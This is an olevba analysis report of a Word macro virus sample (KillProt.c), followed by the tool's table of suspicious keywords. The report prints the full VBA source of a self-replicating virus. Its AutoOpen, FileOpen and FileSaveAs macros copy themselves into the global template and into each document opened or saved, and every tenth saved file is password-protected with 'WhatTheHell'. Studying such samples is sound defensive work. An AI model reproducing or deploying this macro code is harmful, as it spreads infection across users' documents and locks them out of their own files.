olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim MyFile$
    On Error Resume Next
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MyFile$ + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy MyFile$ + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy MyFile$ + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy MyFile$ + ":FileOpen", "Global:FileOpen"

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
    WordBasic.CurValues.ToolsMacro dlg
    WordBasic.Dialog.ToolsMacro dlg
    WordBasic.ToolsMacro dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim MyCount
Dim MyFile$
    On Error Resume Next
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    MyCount = WordBasic.Val(WordBasic.[GetProfileString$]("Infector", "Count"))
    WordBasic.SetProfileString "Infector", "Count", Str(MyCount + 1)
    If MyCount Mod 10 = 0 And MyCount > 0 Then
        ' password protect every ten files
        dlg.Password = "WhatTheHell"
    Else
        ' make it a template so that it can store the code
        ' and the virus can spread
        If dlg.Format = 0 Then dlg.Format = 1
        ' now create a copy of this macro in to new document
    End If
    WordBasic.FileSaveAs dlg
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
    WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim MyFile$
    On Error Resume Next
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    ' now that the file has been opened, lets convert it to a Template
    ' save the macros in it, and save it
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
    WordBasic.FileSaveAs Format:=1, Name:=MyFile$

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.KillProt.c-6760f24dd4059bda345a73b9370d0e7345849b4d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Run when file is opened"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim MyFile$
    On Error Resume Next
    ' when this document is opened, copy the FileSaveAs macro to the
    ' Global Macros
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MyFile$ + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy MyFile$ + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy MyFile$ + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy MyFile$ + ":FileOpen", "Global:FileOpen"
    ' I'd like to go through the list of open documents
    ' and spread the virus there as well
    ' store the name of the Windows Just Opened
'   NewFile$ = MyFile$
'   For C = 1 To CountWindows() - 1
'       WindowList C
'       MyFile$ = FileNameFromWindow$(C)
'       If MyFile$ <> "" And MyFile$ <> NewFile$ Then
'           MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
'           MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
'           MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
'           MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
'           FileSaveAs .Name = MyFile$, .Format = 1
'       EndIf
'   Next C
'   ' Now set the focus back to new window
'   For C = 1 To CountWindows()
'       If NewFile$ = FileNameFromWindow$(C) Then
'       WindowList C
'   Next C
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

